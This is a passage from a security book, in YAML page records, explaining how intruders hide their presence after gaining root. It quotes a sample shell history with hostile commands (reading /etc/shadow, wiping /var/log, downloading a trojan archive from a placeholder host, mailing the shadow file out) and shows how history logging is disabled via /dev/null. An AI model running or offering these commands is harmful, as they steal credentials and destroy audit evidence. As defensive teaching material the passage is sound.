- pgno: 174
  md: 'After gaining root privileges on a host, intruders are likely to want to maintain
    continued access. In addition, an intruder may want to clear his or her tracks
    so that his or her presence is not noticed by the system administrators. This
    chapter describes various techniques and tools intruders often use to hide their
    presence and to ensure continued access to victim hosts.


    # CLEAN LOGS


    What follows are some of the techniques used by intruders to disable and clean
    logging mechanisms and files.


    # Shell History


    Command-line shells often create log files that contain recently executed commands.
    For example, the bash shell creates a .bash_history file in the user''s directory.
    One can use the `tail` command to check the last 20 commands executed by the user:


    ```

    ```bash

    [bash]# tail -20 /root/.bash_history

    cat /etc/shadow

    rm -rf /var/log/*

    ifconfig -a

    netstat -nap

    wget http://hacker''s_ip/trojans.tgz

    mkdir ...

    mv trojans.tgz ...

    cd ...

    tar zxvf trojans.tgz

    ../configure

    make install

    ifconfig -a

    ps U root

    lastlog

    ls -aR ~ | more

    clear

    route -n

    cat /etc/shadow | mail hacker@hacker''s_ip

    rm -rf /var/log/maillog

    ```

    ```


    This snippet of `/root/.bash_history` provides a good example of typical hacker
    activities that often occur after a host is compromised.'
  merge: -1
  img_proc: true
- pgno: 175
  md: '![](img/77287f6ef97ef0bed6e23f6610950d06_175_0.png)


    # Disable Shell History


    In order to disable command history logging, an intruder may set the shell''s
    history file to be a symbolic link to /dev/null:


    ```

    [bash]#  rm -rf /.bash_history

    [bash]#  ln -s /dev/null /root/.bash_history

    ```


    Now, any process that attempts to write to /root/.bash_history will really be
    writing to /dev/null, which is a special file that contains nothing (null). This
    will cause all history data written by the bash shell to be discarded.


    ![](img/77287f6ef97ef0bed6e23f6610950d06_175_1.png)


    # Enable System Auditing and Logging


    The purpose of the shell history files is to help users recall recently executed
    commands. It was never designed to provide any sort of logging mechanism from
    a system security point of view. Information contained in a user''s shell history
    file should not be trusted as the users may delete or edit this file to contain
    any information they wish. Instead, administrators should concentrate their efforts
    towards enabling and hardening system auditing and logging policies as described
    in Part II of this book.


    # Cleaning /var


    The /var directory usually contains the following log files:


    +   - **utmp** and **wtmp** Contain information about users that are logged on
    to the system

    +   - **messages** and **secure** Used by the syslog daemon to record logging
    information submitted by various applications and daemons

    +   - **xferlog** Used by FTP daemons to record data transfer requests

    +   - **maillog** Used by SMTP servers to record mail transfers

    +   - **lastlog** Contains information about users that have recently logged in


    An intruder may manually edit the files just listed to conceal his or her presence.
    Most often, intruders make use of automated tools such as zap3 to accomplish this
    task. The zap3 tool can clean utmp,'
  merge: -1
  img_proc: true
